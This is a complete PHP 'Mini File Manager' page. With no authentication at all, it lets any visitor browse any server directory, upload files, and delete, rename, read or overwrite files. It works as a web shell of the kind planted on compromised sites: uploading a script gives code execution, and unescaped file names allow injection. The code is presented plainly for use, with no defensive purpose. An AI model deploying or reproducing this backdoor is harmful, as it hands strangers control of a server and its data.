<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
$dir = is_dir($dir) ? $dir : __DIR__;
function breadcrumb($dir) {
  $parts = explode(DIRECTORY_SEPARATOR, $dir);
  $path = '';
  $out = [];

  // handle root (linux / atau windows C:\)
  if (DIRECTORY_SEPARATOR === '\\') {
    $path = array_shift($parts); // C:
    $out[] = "<a href='?dir=" . urlencode($path) . "'>$path</a>";
  } else {
    $out[] = "<a href='?dir=/'>/</a>";
  }

  foreach ($parts as $p) {
    if ($p === '') continue;
    $path .= DIRECTORY_SEPARATOR . $p;
    $out[] = "<a href='?dir=" . urlencode($path) . "'>$p</a>";
  }

  return implode(" / ", $out);
}
if (isset($_POST['upload'])) {
  move_uploaded_file($_FILES['f']['tmp_name'], $dir.'/'.$_FILES['f']['name']);
}

if (isset($_GET['delete'])) {
  $p = $dir.'/'.$_GET['delete'];
  is_dir($p) ? rmdir($p) : unlink($p);
}

if (isset($_POST['rename'])) {
  rename($dir.'/'.$_POST['old'], $dir.'/'.$_POST['new']);
}

if (isset($_POST['save'])) {
  file_put_contents($dir.'/'.$_POST['file'], $_POST['content']);
}

$files = scandir($dir);
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Mini File Manager</title>

<style>
body {
  font-family: Arial, sans-serif;
  background: #0f172a;
  color: #e2e8f0;
  margin: 0;
  padding: 20px;
}

h3 {
  margin-bottom: 10px;
  color: #38bdf8;
}

a {
  color: #22c55e;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

.box {
  background: #1e293b;
  padding: 10px;
  border-radius: 8px;
  margin-bottom: 15px;
}

.file {
  padding: 6px 10px;
  border-bottom: 1px solid #334155;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.file:hover {
  background: #334155;
}

input, button, textarea {
  background: #020617;
  color: #e2e8f0;
  border: 1px solid #334155;
  padding: 5px;
  border-radius: 5px;
}

button {
  cursor: pointer;
}

button:hover {
  background: #334155;
}

textarea {
  width: 100%;
  height: 300px;
  margin-top: 10px;
}

.small {
  font-size: 12px;
  color: #94a3b8;
}
</style>

</head>
<body>

<h3>📁 <?= breadcrumb($dir) ?></h3>

<div class="box">
  <form>
    <input name="dir" value="<?= htmlspecialchars($dir) ?>" style="width:300px">
    <button>Go</button>
  </form>
  <br>
  <a href="?dir=<?= urlencode(dirname($dir)) ?>">⬆️ Up</a>
</div>

<div class="box">
  <form method="post" enctype="multipart/form-data">
    <input type="file" name="f">
    <button name="upload">Upload</button>
  </form>
</div>

<div class="box">
<?php foreach ($files as $f): if ($f=='.'||$f=='..') continue; ?>
  <?php $path = $dir.'/'.$f; ?>
  
  <div class="file">
    <div>
      <?php if (is_dir($path)): ?>
        📁 <a href="?dir=<?= urlencode($path) ?>"><?= $f ?></a>
      <?php else: ?>
        📄 <?= $f ?>
        <span class="small">
          <a href="?edit=<?= urlencode($f) ?>&dir=<?= urlencode($dir) ?>">edit</a>
        </span>
      <?php endif; ?>
    </div>

    <div>
      <a href="?delete=<?= urlencode($f) ?>&dir=<?= urlencode($dir) ?>">❌</a>

      <form method="post" style="display:inline">
        <input type="hidden" name="old" value="<?= $f ?>">
        <input name="new" placeholder="rename" style="width:80px">
        <button name="rename">OK</button>
      </form>
    </div>
  </div>

<?php endforeach; ?>
</div>

<?php if (isset($_GET['edit'])): 
  $file = $_GET['edit'];
  $content = @file_get_contents($dir.'/'.$file);
?>
<div class="box">
  <form method="post">
    <input type="hidden" name="file" value="<?= $file ?>">
    <b>Edit: <?= $file ?></b>
    <textarea name="content"><?= htmlspecialchars($content) ?></textarea>
    <br>
    <button name="save">Save</button>
  </form>
</div>
<?php endif; ?>

</body>
</html>